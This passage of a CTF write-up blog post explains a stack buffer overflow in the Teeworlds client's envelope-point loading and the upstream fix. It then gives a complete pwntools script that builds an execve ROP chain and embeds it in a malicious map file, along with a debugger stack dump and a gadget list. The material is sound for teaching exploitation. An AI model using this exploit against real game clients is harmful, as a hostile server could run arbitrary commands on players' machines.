+<h2 id="buffer-overflow">Buffer overflow<a href="#buffer-overflow" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>The faulty function will load all points of all envelopes from the map and return them as array. It starts by locating and loading the data of all points from the map.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> CMapLayers<span style="color:#f92672">::</span>LoadEnvPoints(<span style="color:#66d9ef">const</span> CLayers <span style="color:#f92672">*</span>pLayers, array<span style="color:#f92672">&lt;</span>CEnvPoint<span style="color:#f92672">&gt;&amp;</span> lEnvPoints)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	lEnvPoints.clear();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// get envelope points
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	CEnvPoint <span style="color:#f92672">*</span>pPoints <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> Start, Num;
+</span></span><span style="display:flex;"><span>		pLayers<span style="color:#f92672">-&gt;</span>Map()<span style="color:#f92672">-&gt;</span>GetType(MAPITEMTYPE_ENVPOINTS, <span style="color:#f92672">&amp;</span>Start, <span style="color:#f92672">&amp;</span>Num);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>Num)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		pPoints <span style="color:#f92672">=</span> (CEnvPoint <span style="color:#f92672">*</span>)pLayers<span style="color:#f92672">-&gt;</span>Map()<span style="color:#f92672">-&gt;</span>GetItem(Start, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>As next step, it requests the number of envelopes from the index.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>	<span style="color:#75715e">// get envelopes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> Start, Num;
+</span></span><span style="display:flex;"><span>	pLayers<span style="color:#f92672">-&gt;</span>Map()<span style="color:#f92672">-&gt;</span>GetType(MAPITEMTYPE_ENVELOPE, <span style="color:#f92672">&amp;</span>Start, <span style="color:#f92672">&amp;</span>Num);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>Num)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
+</span></span></code></pre></div><p>After this preparations the interesting part of the function starts. The function will loop over all envelopes and parses them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> env <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; env <span style="color:#f92672">&lt;</span> Num; env<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		CMapItemEnvelope <span style="color:#f92672">*</span>pItem <span style="color:#f92672">=</span> (CMapItemEnvelope <span style="color:#f92672">*</span>)pLayers<span style="color:#f92672">-&gt;</span>Map()<span style="color:#f92672">-&gt;</span>GetItem(Start<span style="color:#f92672">+</span>env, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span></code></pre></div><p>If the envelope has version 3 or above, it&rsquo;s points are already saved in version 2 and can be read directly from file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(pItem<span style="color:#f92672">-&gt;</span>m_Version <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pItem<span style="color:#f92672">-&gt;</span>m_NumPoints; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>				lEnvPoints.add(pPoints[i <span style="color:#f92672">+</span> pItem<span style="color:#f92672">-&gt;</span>m_StartPoint]);
+</span></span><span style="display:flex;"><span>		}
+</span></span></code></pre></div><p>Envelopes with lower versions will use the old point format, lacking the tangent arrays. To have all points in the new format, they are converted to the new format. Due to the nature of the pointer arithmetic in C and C++ and the used parsing of the entire file region as points of the old version, all points have to have the same version or the points of the old format have to come first, leaving a hole between the different versions or requiring overlapping indices.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// backwards compatibility
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pItem<span style="color:#f92672">-&gt;</span>m_NumPoints; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// convert CEnvPoint_v1 -&gt; CEnvPoint
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				CEnvPoint_v1 <span style="color:#f92672">*</span>pEnvPoint_v1 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>((CEnvPoint_v1 <span style="color:#f92672">*</span>)pPoints)[i <span style="color:#f92672">+</span> pItem<span style="color:#f92672">-&gt;</span>m_StartPoint];
+</span></span><span style="display:flex;"><span>				CEnvPoint p;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				p.m_Time <span style="color:#f92672">=</span> pEnvPoint_v1<span style="color:#f92672">-&gt;</span>m_Time;
+</span></span><span style="display:flex;"><span>				p.m_Curvetype <span style="color:#f92672">=</span> pEnvPoint_v1<span style="color:#f92672">-&gt;</span>m_Curvetype;
+</span></span></code></pre></div><p>Maybe in an attempt to speed up the conversion, only used channels are copied over to the sturct of the new version. Since the server controls the number of channels and they are parsed as 32-bit signed integer, the server can specify a much larger numbers of channels. Since C-arrays have no bounds checks, the data will be written as the array is large enough to hold them. Since the tangents follow the copied values, they will be overwritten by the excess values. As a consequence, this allows the server to overflow the stack. The length of the overflow can be chosen by the number of channels. After the copied memory content, the tangent arrays will always write 64 null bytes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>				<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; c <span style="color:#f92672">&lt;</span> pItem<span style="color:#f92672">-&gt;</span>m_Channels; c<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					p.m_aValues[c] <span style="color:#f92672">=</span> pEnvPoint_v1<span style="color:#f92672">-&gt;</span>m_aValues[c];
+</span></span><span style="display:flex;"><span>					p.m_aInTangentdx[c] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>					p.m_aInTangentdy[c] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>					p.m_aOutTangentdx[c] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>					p.m_aOutTangentdy[c] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				lEnvPoints.add(p);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The merged pull request fixes this by capping the number of channels at 4 with the help of the <code>minimum</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; c <span style="color:#f92672">&lt;</span> minimum(pItem<span style="color:#f92672">-&gt;</span>m_Channels, <span style="color:#ae81ff">4</span>); c<span style="color:#f92672">++</span>)
+</span></span></code></pre></div><h2 id="setup">Setup<a href="#setup" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Before we can start examining the context of the overflow and exploiting the service, we have to get a working server distributing our carefully crafted exploit map. The</p>
+<h2 id="stack">Stack<a href="#stack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Since we now know, how to trigger the overflow and which content will be written, we can examine the overflow in the Teeworlds client used in this challenge. For an easier file exploit file, we will reduce the number of points in envelope 1 to 1, such that the overflow will be triggered only once. By replacing the first two values with 0x41414141 (&ldquo;AAAA&rdquo;) and after copying both values over to the stack, our payload is written to 0x7ffffffddc78 and the next return address can be found at 0x7ffffffddd08. As a result of this, 0x90 bytes of padding are needed in front of the ROP chain. Since the overflow is measured in units of 4 bytes, this corresponds to a padding of 34 channels. As already known from the Dockerfile, no canary is present.</p>
+<pre tabindex="0"><code>pwndbg&gt; stack 50
+00:0000│ rsp 0x7ffffffddc30 ◂— 0x0
+01:0008│     0x7ffffffddc38 —▸ 0xa496b0 ◂— 0x100000000
+02:0010│     0x7ffffffddc40 —▸ 0x7ffffffddc70 ◂— 0x1
+03:0018│     0x7ffffffddc48 ◂— 0x100000000
+04:0020│     0x7ffffffddc50 ◂— 0x0
+05:0028│     0x7ffffffddc58 —▸ 0x77d180 ◂— 0xc00000005
+06:0030│     0x7ffffffddc60 ◂— 0x0
+07:0038│     0x7ffffffddc68 ◂— 0x600000006
+08:0040│     0x7ffffffddc70 ◂— 0x1
+09:0048│ rax 0x7ffffffddc78 ◂— &#39;AAAAAAAA&#39;
+0a:0050│     0x7ffffffddc80 ◂— 0x0
+... ↓        5 skipped
+10:0080│     0x7ffffffddcb0 —▸ 0x74cd58 —▸ 0x70616d ◂— 0x0
+11:0088│     0x7ffffffddcb8 ◂— 0x0
+12:0090│     0x7ffffffddcc0 —▸ 0x74cd58 —▸ 0x70616d ◂— 0x0
+13:0098│     0x7ffffffddcc8 —▸ 0x521915 ◂— 0x657661530070616d /* &#39;map&#39; */
+14:00a0│     0x7ffffffddcd0 ◂— 0x10
+15:00a8│     0x7ffffffddcd8 —▸ 0x55bf40 (gs_MapLayersBackGround) —▸ 0x54cef8 —▸ 0x46b8d0 (CMapLayers::~CMapLayers()) ◂— endbr64
+16:00b0│     0x7ffffffddce0 —▸ 0x77c8d0 —▸ 0x54d820 —▸ 0x4b5f20 (CGameClient::~CGameClient()) ◂— endbr64
+17:00b8│     0x7ffffffddce8 —▸ 0x77d180 ◂— 0xc00000005
+18:00c0│     0x7ffffffddcf0 —▸ 0x7ffff6bfa010 —▸ 0x54bfc0 —▸ 0x43db00 (CClient::~CClient()) ◂— endbr64
+19:00c8│     0x7ffffffddcf8 —▸ 0x7ffffffddd80 —▸ 0x7ffff6c06a82 ◂— 0x375a5dfe52ada70b
+1a:00d0│     0x7ffffffddd00 ◂— 0x1
+1b:00d8│     0x7ffffffddd08 —▸ 0x46b752 (CMapLayers::OnMapLoad()+34) ◂— mov    rdi, qword ptr [rbx + 8]
+1c:00e0│     0x7ffffffddd10 —▸ 0x7ffff6bfa010 —▸ 0x54bfc0 —▸ 0x43db00 (CClient::~CClient()) ◂— endbr64
+1d:00e8│     0x7ffffffddd18 ◂— 0xb /* &#39;\x0b&#39; */
+1e:00f0│     0x7ffffffddd20 —▸ 0x77d180 ◂— 0xc00000005
+1f:00f8│     0x7ffffffddd28 —▸ 0x4b5e0b (CGameClient::OnConnected()+75) ◂— mov    rdi, qword ptr [rbp + rbx*8 + 0x10]
+20:0100│     0x7ffffffddd30 —▸ 0x7fffffffdee0 ◂— 0x100000000
+21:0108│     0x7ffffffddd38 —▸ 0x7ffff6bfa010 —▸ 0x54bfc0 —▸ 0x43db00 (CClient::~CClient()) ◂— endbr64
+22:0110│     0x7ffffffddd40 ◂— 0x0
+23:0118│     0x7ffffffddd48 —▸ 0x43ba7a (CClient::ProcessServerPacket(CNetChunk*)+1482) ◂— jmp    0x43b5c8
+24:0120│     0x7ffffffddd50 ◂— 0x568
+25:0128│     0x7ffffffddd58 ◂— 0x0
+... ↓        4 skipped
+2a:0150│     0x7ffffffddd80 —▸ 0x7ffff6c06a82 ◂— 0x375a5dfe52ada70b
+2b:0158│     0x7ffffffddd88 —▸ 0x7ffff6c06a83 ◂— 0x5375a5dfe52ada7
+2c:0160│     0x7ffffffddd90 —▸ 0x7ffff6c06a83 ◂— 0x5375a5dfe52ada7
+2d:0168│     0x7ffffffddd98 ◂— 0x0
+... ↓        4 skipped
+</code></pre><h1 id="exploit">Exploit<a href="#exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>With this information we cant start developing the exploit. Since the flag is stored in a file and the Rust script forwards the stdout of the client to us, a simple ROP chain leaking it&rsquo;s content is sufficient to solve this challenge. So let&rsquo;s have a look at the available gadgets by using <code>ROPgadget --binary teeworlds</code>. Under the 49198 gadgets found by ROPgadget are a huge amount of basic instructions with a variaty of registers, including gadgets for a syscall with three arguments.</p>
+<pre tabindex="0"><code>0x000000000045f135 : mov qword ptr [rdi], rax ; ret
+0x000000000043faf0 : pop rax ; ret
+0x00000000004326e3 : pop rdi ; ret
+0x00000000004bc1d4 : pop rdx ; ret
+0x0000000000437fcb : pop rsi ; ret
+0x0000000000465f30 : syscall
+</code></pre><p>Since most of the <code>syscall</code> gadgets are followed by bad instructions or dereferenciations of rax, most syscalls will be followed by a crash. A solution to this problem is the <code>execve</code> syscall, since it replaces the entire process with the new one. <code>execve</code> needs three arguments: the path of the new executable, its arguments and its environment. While the first argument is mandatory, the following ones can also be null. Since we want to log the content of a file, <code>cat</code> is a viable target. Since <code>cat</code> expects the file to print as it&rsquo;s argument, we also need to build argv. Because the service is compiled without PIE, we not only know the address of the gadgets but also the address of the writable bss segment containing uninitialized global variables. This allows us to use one of the move instructions, such as <code>mov qword ptr [rdi], rax; ret</code>, to prepare the argument array by first popping the memory content and it&rsquo;s address and then moving it to the previously popped address.</p>
+<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">pop rax; ret
+$content
+pop rdi; ret
+$address
+mov qword ptr [rdi], rax; ret
+</code></pre><p>Since <code>cat</code> may be in different places on our system and the one used by the service and we wanted the exploit to also work on our system for testing purposes, we decided to use <code>sh</code> for resolving <code>cat</code>. The full argv will therefore be <code>[&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat /home/rwctf/flag&quot;]</code>.</p>
+<p>Now we can start developing the exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./teeworlds&#39;</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span></code></pre></div><p>Let&rsquo;s begin with writing <code>argv</code> into the bss section. Since strings in C are null-terminated, we can use null bytes to easily seperate the arguments.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>argv <span style="color:#f92672">=</span> [<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat /home/rwctf/flag&#34;</span>]
+</span></span><span style="display:flex;"><span>flat_argv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(argv) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>    <span style="color:#75715e"># concatenate arguments with terminating null bytes</span>
+</span></span><span style="display:flex;"><span>argv_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6c0000</span>                   <span style="color:#75715e"># address inside bss segment</span>
+</span></span></code></pre></div><p><code>argv</code> is a null-terminated array of string pointers, each containing one argument. So let&rsquo;s calculate the positions of the individual arguments.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># write pointer</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>content_start <span style="color:#f92672">=</span> argv_start <span style="color:#f92672">+</span> (len(argv)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>qwords <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(argv)):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># calculate address</span>
+</span></span><span style="display:flex;"><span>    qwords<span style="color:#f92672">.</span>append(p64(content_start <span style="color:#f92672">+</span> offset))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># adjust offset</span>
+</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">+=</span> len(argv[i]) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># append terminating null pointer</span>
+</span></span><span style="display:flex;"><span>qwords<span style="color:#f92672">.</span>append(p64(<span style="color:#ae81ff">0</span>))
+</span></span></code></pre></div><p>Since the code for moving 8 bytes to bss does not discriminate between pointers and strings, we can also add the content of <code>argv</code> in 8 byte chunks to the list before writing it to the bss segment. Since <code>argv</code> does not need to have a length divisible by 8, we have to ensure this by padding with null bytes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># add content of argv</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> pos <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(flat_argv)<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>    qwords<span style="color:#f92672">.</span>append(flat_argv[pos:pos<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>))  <span style="color:#75715e"># ensure 8 bytes</span>
+</span></span></code></pre></div><p>Now we can write the prepared <code>argv</code> to it&rsquo;s destination.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>destination <span style="color:#f92672">=</span> argv_start
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> qword <span style="color:#f92672">in</span> qwords:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># pop destination to rdi</span>
+</span></span><span style="display:flex;"><span>    rop_chain <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address)
+</span></span><span style="display:flex;"><span>    rop_chain <span style="color:#f92672">+=</span> p64(destination)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># pop content to rax</span>
+</span></span><span style="display:flex;"><span>    rop_chain <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>rax<span style="color:#f92672">.</span>address)
+</span></span><span style="display:flex;"><span>    rop_chain <span style="color:#f92672">+=</span> qword
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># move content to destination</span>
+</span></span><span style="display:flex;"><span>    rop_chain <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x45f135</span>)  <span style="color:#75715e"># mov qword ptr [rdi], rax; ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># advance destination</span>
+</span></span><span style="display:flex;"><span>    destination <span style="color:#f92672">+=</span> <span style="color:#ae81ff">8</span>
+</span></span></code></pre></div><p>Finally, we have to execute the syscall.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># do syscall</span>
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address)
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(content_start)     <span style="color:#75715e"># argv[0]</span>
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>rsi<span style="color:#f92672">.</span>address)
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(argv_start)        <span style="color:#75715e"># argv</span>
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>rdx<span style="color:#f92672">.</span>address)
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                 <span style="color:#75715e"># env</span>
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>rax<span style="color:#f92672">.</span>address)
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>)                <span style="color:#75715e"># execve</span>
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>syscall<span style="color:#f92672">.</span>address)
+</span></span></code></pre></div><p>After building the ROP chain, we have to integrate it into the prepared map file. From looking at the pattern data in ImHex, we can spot the relevant parts of the map file that need to be adjusted for the exploit. The number of channels can be found at 0x24c and the overflowable point&rsquo;s values start at 0x750.
+<img src="/img/realworldctf5-teewars-positions.png" alt="Screenshot of the pattern data in ImHex"></p>
+<p>With this information, we can finalize the script by building the exploit map.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># read prepared map from file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;maps/prepared.map&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    map_content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># write with changed parts to file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;maps/exploit.map&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># copy start of file</span>
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(map_content[:<span style="color:#ae81ff">0x24c</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># adjust number of channels</span>
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(p32((len(rop_chain) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x90</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># copy items until start of overflow</span>
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(map_content[<span style="color:#ae81ff">0x250</span>:<span style="color:#ae81ff">0x750</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x90</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># overflow with ROP chain</span>
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(rop_chain)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># copy remaining map content</span>
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(map_content[<span style="color:#ae81ff">0x750</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x90</span><span style="color:#f92672">+</span>len(rop_chain):])
+</span></span></code></pre></div><h1 id="flag">Flag<a href="#flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>After hosting the exploit map on our VM and supplying it&rsquo;s IP address to the service, we got the flag: <code>rwctf{Newb1e_1ear1ng_Game_Map}</code></p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/intentctf22-forensic-tea-party/">
+                <span class="button__text">INTENT CTF 2022 - Forensic Tea Party</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© 2021-2022 CyberTaskForce Zero</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
